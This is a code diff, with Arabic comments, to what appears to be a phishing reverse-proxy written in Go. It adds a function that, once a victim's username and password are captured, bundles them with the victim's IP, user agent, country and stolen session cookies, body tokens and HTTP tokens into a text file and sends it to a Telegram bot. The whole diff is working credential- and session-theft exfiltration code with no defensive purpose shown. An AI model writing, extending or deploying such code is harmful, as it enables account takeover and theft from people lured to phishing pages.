@@ -2218,8 +2218,58 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
 		if s.Username != "" && s.Password != "" {
 			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+			
+			// إرسال الكوكيز كملف نصي إلى تلجرام
+			go p.sendCookiesToTelegram(s)
 		}
 	}
+}
+
+// دالة جديدة لإرسال الكوكيز كملف نصي إلى تلجرام
+func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
+	// تجميع بيانات الكوكيز في نص
+	cookiesText := fmt.Sprintf("=== Cookies for session %s ===\n", s.Id)
+	cookiesText += fmt.Sprintf("Username: %s\n", s.Username)
+	cookiesText += fmt.Sprintf("Password: %s\n", s.Password)
+	cookiesText += fmt.Sprintf("IP: %s\n", s.RemoteAddr)
+	cookiesText += fmt.Sprintf("User-Agent: %s\n", s.UserAgent)
+	cookiesText += fmt.Sprintf("Country: %s (%s)\n\n", s.Country, s.CountryCode)
+	
+	// إضافة بيانات الكوكيز المخزنة
+	cookiesText += "=== Cookie Tokens ===\n"
+	for domain, cookies := range s.CookieTokens {
+		cookiesText += fmt.Sprintf("Domain: %s\n", domain)
+		for name, cookie := range cookies {
+			cookiesText += fmt.Sprintf("  %s = %s\n", name, cookie.Value)
+			cookiesText += fmt.Sprintf("    Path: %s\n", cookie.Path)
+			cookiesText += fmt.Sprintf("    HttpOnly: %t\n", cookie.HttpOnly)
+			cookiesText += fmt.Sprintf("    Expires: %s\n", cookie.Expires.Format(time.RFC3339))
+			cookiesText += "  -----\n"
+		}
+		cookiesText += "\n"
+	}
+	
+	// إضافة بيانات الـ Body Tokens
+	if len(s.BodyTokens) > 0 {
+		cookiesText += "=== Body Tokens ===\n"
+		for name, value := range s.BodyTokens {
+			cookiesText += fmt.Sprintf("%s = %s\n", name, value)
+		}
+		cookiesText += "\n"
+	}
+	
+	// إضافة بيانات الـ HTTP Tokens
+	if len(s.HttpTokens) > 0 {
+		cookiesText += "=== HTTP Tokens ===\n"
+		for name, value := range s.HttpTokens {
+			cookiesText += fmt.Sprintf("%s = %s\n", name, value)
+		}
+		cookiesText += "\n"
+	}
+	
+	// إرسال النص كملف إلى تلجرام
+	fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
+	p.telegram.SendFileFromText(fileName, cookiesText)
 }
 
 func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
